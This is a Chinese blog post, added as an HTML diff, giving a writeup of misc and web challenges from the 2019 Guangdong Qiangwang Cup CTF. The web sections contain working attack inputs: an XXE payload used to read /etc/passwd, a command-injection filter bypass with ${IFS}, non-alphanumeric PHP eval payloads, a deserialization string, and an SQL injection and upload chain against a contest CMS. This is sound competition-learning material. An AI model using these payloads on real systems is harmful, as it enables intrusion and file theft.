@@ -1,0 +1,885 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/static/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/static/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Lzy-wi">
+  <meta name="keywords" content="">
+  <title>2019广东省强网杯writeup - Lzywi&#39;Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Lzywi'Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/static/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-09-11 09:48" pubdate>
+        2019年9月11日 上午
+      </time>
+    </span>
+  
+</div>
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      字数统计:2.1k 字
+    </span>
+  
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      阅读时长:
+      27
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">2019广东省强网杯writeup</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>这个比赛是想好好打的，第一天还好，项目做完了专心打了大半天，下午到快晚上的时候又有事情，导致后面就大概看了一下，没有怎么投入，不过这次比赛<del>脑洞</del>难度不算太大，做的还算不错。<br><a id="more"></a></p>
+<h5 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h5><h6 id="完美的错误"><a href="#完美的错误" class="headerlink" title="完美的错误"></a>完美的错误</h6><p>题目描述：小明在实现避免字符混淆的编码算法时,不小心错位了数组，你能帮他还原代码吗？<code>RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX</code><br>关键点：避免字符混淆<br>这个提示是与base58编码有关，base58与base64的区别参考先知社区的一篇文章–&gt;<a href="https://xz.aliyun.com/t/2255" target="_blank" rel="noopener">传送门</a><br>错位了数组应该是数字和字母换了位置，直接用哪里的代码改一下就出来了<br><pre><code class="hljs python"><span class="hljs-comment">#-*-coding:utf-8</span>
+__b58chars = <span class="hljs-string">'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789'</span> <span class="hljs-comment">#这里原本是123456789A-Za-z的</span>
+__b58base = len(__b58chars)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b58encode</span><span class="hljs-params">(v)</span>:</span>
+    <span class="hljs-string">""" encode v, which is a string of bytes, to base58.
+    """</span>
+
+    long_value = int(v.encode(<span class="hljs-string">"hex_codec"</span>), <span class="hljs-number">16</span>)
+
+    result = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">while</span> long_value &gt;= __b58base:
+        div, mod = divmod(long_value, __b58base)
+        result = __b58chars[mod] + result
+        long_value = div
+    result = __b58chars[long_value] + result
+
+    <span class="hljs-comment"># Bitcoin does a little leading-zero-compression:</span>
+    <span class="hljs-comment"># leading 0-bytes in the input become leading-1s</span>
+    nPad = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> v:
+        <span class="hljs-keyword">if</span> c == <span class="hljs-string">'\0'</span>:
+            nPad += <span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">break</span>
+
+    <span class="hljs-keyword">return</span> (__b58chars[<span class="hljs-number">0</span>] * nPad) + result
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b58decode</span><span class="hljs-params">(v)</span>:</span>
+    <span class="hljs-string">""" decode v into a string of len bytes
+    """</span>
+
+    long_value = <span class="hljs-number">0L</span>
+    <span class="hljs-keyword">for</span> (i, c) <span class="hljs-keyword">in</span> enumerate(v[::<span class="hljs-number">-1</span>]):
+        long_value += __b58chars.find(c) * (__b58base ** i)
+
+    result = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">while</span> long_value &gt;= <span class="hljs-number">256</span>:
+        div, mod = divmod(long_value, <span class="hljs-number">256</span>)
+        result = chr(mod) + result
+        long_value = div
+    result = chr(long_value) + result
+
+    nPad = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> v:
+        <span class="hljs-keyword">if</span> c == __b58chars[<span class="hljs-number">0</span>]:
+            nPad += <span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">break</span>
+
+    result = chr(<span class="hljs-number">0</span>) * nPad + result
+    <span class="hljs-keyword">return</span> result
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    <span class="hljs-comment"># print  b58encode("hello world")</span>
+    <span class="hljs-keyword">print</span>  b58decode(<span class="hljs-string">"RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX"</span>)</code></pre></p>
+<p>flag{adb88f7b70a20983833a7615fb103e01}</p>
+<h6 id="撸啊撸"><a href="#撸啊撸" class="headerlink" title="撸啊撸"></a>撸啊撸</h6><p>用winhex搜索png文件尾发现后面多了东西，提取出来后发现是一段程序，但是文件头损坏了，<code>__mh_execute_header</code>、<code>/usr/lib/libSystem.B.dylib</code>这些都是mach-o的可执行文件格式<del>别问我为什么知道，都是大佬发现的，我只是个复读机</del>，修复文件头如下，找到一个有例子的文章可以参考–&gt;<a href="https://www.jianshu.com/p/07f361f6e0d0" target="_blank" rel="noopener">传送门</a><br><img src="/img/2019-09-11/img_1.png" srcset="/img/static/loading.gif" alt=""><img src="/img/2019-09-11/img_2.png" srcset="/img/static/loading.gif" alt=""><br>程序关键伪代码如下<br><pre><code class="hljs c"><span class="hljs-meta">#start</span>
+__<span class="hljs-function">int64 <span class="hljs-title">start</span><span class="hljs-params">()</span>
+</span>&#123;
+  __int64 result; <span class="hljs-comment">// rax</span>
+  <span class="hljs-keyword">char</span> v1; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span>
+  __int64 v2; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>
+
+  <span class="hljs-built_in">strcpy</span>(&amp;v1, <span class="hljs-string">"938gce1`872db99db`b342d23c0g9g2d"</span>);
+  <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">48</span> )
+    sub_100000E40(&amp;v1);
+  result = __stack_chk_guard;
+  <span class="hljs-keyword">if</span> ( __stack_chk_guard == v2 )
+    result = <span class="hljs-number">0L</span>L;
+  <span class="hljs-keyword">return</span> result;
+&#125;
+#sub_100000E40
+<span class="hljs-keyword">int</span> __<span class="hljs-function">fastcall <span class="hljs-title">sub_100000E40</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1)</span>
+</span>&#123;
+  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span>
+
+  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(a1); ++i )
+    a1[i] ^= <span class="hljs-number">1u</span>;
+  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"flag为:%s\n"</span>, a1);
+&#125;</code></pre></p>
+<pre><code class="hljs python">code = <span class="hljs-string">'938gce1`872db99db`b342d23c0g9g2d'</span>
+text = <span class="hljs-string">''</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> code:
+    text += chr(ord(i)^<span class="hljs-number">1</span>)
+<span class="hljs-keyword">print</span> text
+<span class="hljs-comment">#829fbd0a963ec88ecac253e32b1f8f3e</span></code></pre>
+<p>flag{829fbd0a963ec88ecac253e32b1f8f3e}</p>
+<h6 id="脑筋急转弯"><a href="#脑筋急转弯" class="headerlink" title="脑筋急转弯"></a>脑筋急转弯</h6><p>下载回来是一个wav音频文件，没发现摩斯频谱也没发现什么就卡住了，后来队友说用<code>SilentEye</code>可以提取出一个zip文件<del>我去还有这操作</del><br><img src="/img/2019-09-11/img_3.png" srcset="/img/static/loading.gif" alt=""><br>然后爆破出密码<br><img src="/img/2019-09-11/img_4.png" srcset="/img/static/loading.gif" alt=""><br>得到一堆012012012又卡住了，后来某位大佬把0-&gt;<code>.</code>,1-&gt;<code>!</code>,2-&gt;<code>?</code>然后得到<code>Ook</code>码，然后<code>Ook</code>转<code>Brainfuck</code>转<code>text</code>然后就解出来了O_o..(空格要去掉)<br><pre><code class="hljs undefined">lalala,wo <span class="hljs-keyword">shi </span>mai <span class="hljs-keyword">bao </span>de xiao hang <span class="hljs-keyword">jia.flag&#123;08277716193eda6c592192966e9d6f39&#125; </span>ni neng cai dao ta me?</code></pre></p>
+<p>flag{08277716193eda6c592192966e9d6f39}</p>
+<h5 id="web"><a href="#web" class="headerlink" title="web"></a>web</h5><h6 id="小明又被拒绝了"><a href="#小明又被拒绝了" class="headerlink" title="小明又被拒绝了"></a>小明又被拒绝了</h6><p>题目描述：小明又被拒绝了，你能帮助他吗？<br>抓包添加请求头<code>X-Forwarded-For: 127.0.0.1</code>和把admin改为1<br><img src="/img/2019-09-11/img_5.png" srcset="/img/static/loading.gif" alt=""><br>flag{xxasdasdd_for}</p>
+<h6 id="XX"><a href="#XX" class="headerlink" title="XX?"></a>XX?</h6><p>题目描述：XXXXX？？？<br>联想到XXE，扫描得到<code>index.php</code>和<code>flag.php</code>文件，扫描备份文件得到<code>index.php~</code>文件<br><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">#鍏抽棴Warning</span>
+error_reporting(E_ALL^E_NOTICE^E_WARNING);
+
+$xmlfile = file_get_contents(<span class="hljs-string">'php://input'</span>);
+$dom = <span class="hljs-keyword">new</span> DOMDocument();
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+
+$creds = simplexml_import_dom($dom);
+$user = $creds-&gt;user;
+$pass = $creds-&gt;pass;
+
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"CTF:"</span> . <span class="hljs-string">"&lt;br&gt;"</span> . <span class="hljs-string">"$user"</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></p>
+<p>POST上去一个xxe的payload<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE note[
+&lt;!ELEMENT note (user)&gt;
+&lt;!ENTITY hack3r "Hu3sky"&gt;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>&amp;hack3r;<span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre></p>
+<p><img src="/img/2019-09-11/img_6.png" srcset="/img/static/loading.gif" alt=""><br>成了，有戏，试着读了一下<code>/etc/passwd</code>文件<br><img src="/img/2019-09-11/img_7.png" srcset="/img/static/loading.gif" alt=""><br>ok,已经可以任意文件读取了<br>尝试读取flag.php的时候发现一直读取失败，百思不得其解，web访问也的确存在，队友用php伪协议拿到了<br><img src="/img/2019-09-11/img_8.png" srcset="/img/static/loading.gif" alt=""><br>flag{IUyasd8213123123890}</p>
+<h6 id="免费的-ping一下"><a href="#免费的-ping一下" class="headerlink" title="免费的,ping一下~"></a>免费的,ping一下~</h6><p>题目描述：听说ping很好玩~<br>考察命令执行，过滤了<code>&lt;</code>，<code>&gt;</code>，<code>&amp;</code>，<code>|</code>，<code>空格</code>，<code>%0*</code>，还有一些关键字可以用拼接的方法绕过，可以用<code>${IFS}</code>替换空格，<code>$a=ca;$b=t;$a$b</code>这样的方法来绕过关键字，然后这道题用cat是cat不到flag的，返回的内容有限，所以查到可以用sed查看指定的行<br><pre><code class="hljs undefined"><span class="hljs-attr">A</span>=;a=fl;b=ag;se<span class="hljs-string">""</span>d<span class="hljs-variable">$&#123;IFS&#125;</span>-n<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">'16,18p'</span><span class="hljs-variable">$&#123;IFS&#125;</span>/<span class="hljs-variable">$a</span><span class="hljs-variable">$b</span></code></pre></p>
+<p><img src="/img/2019-09-11/img_9.png" srcset="/img/static/loading.gif" alt=""><br>flag{llllll_U_GeT_Th3_fl4g}</p>
+<h6 id="php"><a href="#php" class="headerlink" title="php"></a>php</h6><p>题目描述：PHP是世界上最…..的语言<br>扫描得到<code>index.php</code><br><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(E_ALL^E_NOTICE^E_WARNING);
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetYourFlag</span><span class="hljs-params">()</span></span>&#123;
+    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">"./flag.php"</span>);
+&#125;
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'code'</span>]))&#123;
+    $code = $_GET[<span class="hljs-string">'code'</span>];
+    <span class="hljs-comment">//print(strlen($code));</span>
+    <span class="hljs-keyword">if</span>(strlen($code)&gt;<span class="hljs-number">27</span>)&#123; 
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">"Too Long."</span>);
+    &#125;
+
+    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/[a-zA-Z0-9_&amp;^&lt;&gt;"\']+/'</span>,$_GET[<span class="hljs-string">'code'</span>])) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">"Not Allowed."</span>);
+    &#125;
+    @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'code'</span>]);
+&#125;<span class="hljs-keyword">else</span>&#123;
+      highlight_file(<span class="hljs-keyword">__FILE__</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></p>
+<p>这是一个无字符马，可以参考freebuf上的一篇文章–&gt;<a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">传送门</a>，这是php7的一个解析特性，简单来说就是通过和<code>~</code>符号异或出我们需要的字符。<br><pre><code class="hljs undefined">(~<span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%97</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%96</span><span class="hljs-symbol">%91</span><span class="hljs-symbol">%99</span><span class="hljs-symbol">%90</span>)()<span class="hljs-comment">;</span></code></pre></p>
+<p>这个是phpinfo();的一个payload，可以看到webshell是可以成功执行的<br><img src="/img/2019-09-11/img_10.png" srcset="/img/static/loading.gif" alt=""><br>然后上面也给了getflag的函数我们，直接调用就可以了<br><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$a = urlencode(~<span class="hljs-string">'GetYourFlag'</span>);
+<span class="hljs-keyword">echo</span> $a;
+<span class="hljs-comment">//%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98</span></code></pre></p>
+<p>payload为<code>(~%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98)();</code><br><img src="/img/2019-09-11/img_11.png" srcset="/img/static/loading.gif" alt=""><br>flag{3904c5df2e894ca02a21004feb21e617}<br>备注：php是世界上最好的语言hah</p>
+<h6 id="API"><a href="#API" class="headerlink" title="API"></a>API</h6><p>题目描述：API<br>打开提示<code>Api!wow</code>，访问api目录提示<br><img src="/img/2019-09-11/img_12.png" srcset="/img/static/loading.gif" alt=""><br>提示<code>post filename</code>和传入一个数组，不赋值时候提示<code>json_decode error</code>,固传入一个json数组，盲猜file参数。结果正确<br><img src="/img/2019-09-11/img_13.png" srcset="/img/static/loading.gif" alt=""><br>在这里浪费了很多时间来绕过stristr，发现是绕不过的。然后读取../index.php<br><img src="/img/2019-09-11/img_14.png" srcset="/img/static/loading.gif" alt=""><br>得到源码，看了下，是反序列化。把hack.php也读出来<br><img src="/img/2019-09-11/img_15.png" srcset="/img/static/loading.gif" alt=""><br>看来没错了。通过反序列化来读取fffffaa_not.php这个文件源码。(<a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">小声bb</a>:<a href="https://www.cnblogs.com/pureqh/p/10161993.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">全都是网上原题</a>)<br>通过../index.php的过滤条件可以构造出反序列化的字符串<br><pre><code class="hljs undefined"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:+4</span><span class="hljs-selector-pseudo">:"hack"</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"file"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">15</span>:<span class="hljs-string">"fffffaa_not.php"</span>;&#125;</code></pre></p>
+<p>发送的时候需要url编码一下。然后得到源码fffffaa_not.php<br><img src="/img/2019-09-11/img_16.png" srcset="/img/static/loading.gif" alt=""><br>是一个写shell的功能。其中判断规则preg_match(‘[&lt;&gt;?]’, $text)。<br>这个绕过很简单了，变成数组就可以了。参考–&gt;<a href="https://blog.stkusami.com/archives/56" target="_blank" rel="noopener">传送门</a><br><img src="/img/2019-09-11/img_17.png" srcset="/img/static/loading.gif" alt=""><br>成了，直接getshell拿flag<br><img src="/img/2019-09-11/img_18.png" srcset="/img/static/loading.gif" alt=""><br>flag{Oiahhh1_iiu123}</p>
+<h6 id="找漏洞"><a href="#找漏洞" class="headerlink" title="找漏洞"></a>找漏洞</h6><p>题目描述：小明失恋后写了一个CMS，你能帮他找找漏洞吗？<br>这道题大佬做出来了，我就学习一波。<br>根据题目给出的源码包，程序是laravel 框架写的，这套框架和Django的编程思想差不多。不懂的可以先去看看 laravel 框架的设计逻辑。<br>首先审计一下路由有什么可以用的。<br><img src="/img/2019-09-11/img_19.png" srcset="/img/static/loading.gif" alt=""><br>可以看到有5个路由。漏洞入口点是第一个路由user_testpage/{id}，其余的都要登陆后才能使用。在App\Http\Controllers\UserController 里面的index方法。<br><img src="/img/2019-09-11/img_20.png" srcset="/img/static/loading.gif" alt=""><br>可以看到有个注入，只是简单的替换了关键字。直接sqlmap跑。Dump出数据<br><img src="/img/2019-09-11/img_21.png" srcset="/img/static/loading.gif" alt=""><br>可以看到有3条数据。刚开始尝试了暴力破解等方法。都没成功。随后在github上找了hash对比的工具，刚开始并不顺利，全部hash都是false。接着翻源码的时候意外发现一个password，在\backup\database\factories\UserFactory.php<br><img src="/img/2019-09-11/img_22.png" srcset="/img/static/loading.gif" alt=""><br>总感觉后面的注释是密码。一试果然成功。数据库里面前两个的password都是假的……<br><img src="/img/2019-09-11/img_23.png" srcset="/img/static/loading.gif" alt=""><br>登陆后台之后，就直接跳到上传吧<br><img src="/img/2019-09-11/img_24.png" srcset="/img/static/loading.gif" alt=""><br>首先带着cookie访问<code>http://119.61.19.212:8085/home/uploadto_upload</code>，会得到一个html<br><img src="/img/2019-09-11/img_25.png" srcset="/img/static/loading.gif" alt=""><br>意思是按照这个格式构造上传包。这里需要改改。Action填入的是<code>http://119.61.19.212:8085/home/uploadss/NotAllow6171</code>,<code>files</code>标签也要改。改成符合上传包的格式,这里需要注意<code>uploadss</code>后面是需要跟一个key，key从哪里来?回头看看数据库第二条。<br><img src="/img/2019-09-11/img_26.png" srcset="/img/static/loading.gif" alt=""><br><del>首先这里……十分恶心</del>。刚开始一直以为上传点是不行的。然后我在源码注意到了<code>template.blade.php</code>。才把文件名改成template.blade.php 。然后在哪触发呢？blade框架中是类似于一个模板，需要在Controller中用view的方法展现。所以刚好ProfileController.php 中view了。所以就可以通过此方法覆盖php文件啦<br><img src="/img/2019-09-11/img_27.png" srcset="/img/static/loading.gif" alt=""><br>但是回到上传那里，虽然不拦截后缀。却不能上传新文件，也不能覆盖php代码进去，所以这里可以利用框架特性。template.blade.php是个模板文件。有特有的语法。经别人点化后在源码中其实有一个文件读取<br><img src="/img/2019-09-11/img_28.png" srcset="/img/static/loading.gif" alt=""><br>这个怎么用呢，看下图吧<br><img src="/img/2019-09-11/img_29.png" srcset="/img/static/loading.gif" alt=""><br>构造post包发送<br><img src="/img/2019-09-11/img_30.png" srcset="/img/static/loading.gif" alt=""><br>访问<code>http://119.61.19.212:8085/home/profile</code>出flag<br><img src="/img/2019-09-11/img_31.png" srcset="/img/static/loading.gif" alt=""><br>flag{Ucan_wow_easy_qaq}</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/misc/">misc</a>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/writewp/">writewp</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/09/21/fluid-add-hitokoto/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">fluid主题博客主页添加一言(hitokoto)手把手教学</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/07/22/Emergency_Response/">
+                        <span class="hidden-mobile">应急响应之linux篇</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz",
+          app_key: "i3vUWkHRRkiiS7LuUpuIm1E5",
+          placeholder: "说些什么",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "sRx9dQVqzL65gdhuYexJtTPF",
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" rel="nofollow noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    
+  <div class="statistics">
+    
+    
+    <i class="iconfont icon-users"></i>
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      <i class="iconfont icon-friends"></i>
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+    
+      
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-codeforces"></i>
+        全站共计:31.9k 字
+      </span>
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer>
+  (function () {
+    // 查询存储的记录
+    function getRecord(Counter, target) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({target})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {target, time: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    }
+
+    // 发起自增请求
+    function increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
